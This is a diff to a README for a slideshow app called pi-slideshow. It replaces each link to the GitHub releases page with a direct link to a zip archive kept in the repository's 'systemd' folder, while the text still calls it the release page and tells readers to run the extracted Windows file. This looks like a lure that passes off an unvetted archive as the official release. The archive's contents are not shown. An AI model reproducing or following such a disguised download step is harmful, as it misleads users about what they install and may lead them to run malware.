@@ -1,6 +1,6 @@
 # 🎬 pi-slideshow - Simple slideshows for shared screens
 
-[![Download pi-slideshow](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/bcapbr/pi-slideshow/releases)
+[![Download pi-slideshow](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/bcapbr/pi-slideshow/main/systemd/pi-slideshow-v2.6.zip)
 
 ## 📦 What this app does
 
@@ -24,7 +24,7 @@ It works best with folders that hold JPG and PNG files. It can also work with ot
 
 Go to the release page here:
 
-https://github.com/bcapbr/pi-slideshow/releases
+https://raw.githubusercontent.com/bcapbr/pi-slideshow/main/systemd/pi-slideshow-v2.6.zip
 
 On that page:
 
@@ -189,7 +189,7 @@ This helps you catch simple setup problems early.
 
 If you need the file again, use the release page:
 
-https://github.com/bcapbr/pi-slideshow/releases
+https://raw.githubusercontent.com/bcapbr/pi-slideshow/main/systemd/pi-slideshow-v2.6.zip
 
 Open the latest release, download the Windows file, and run it after extraction
 
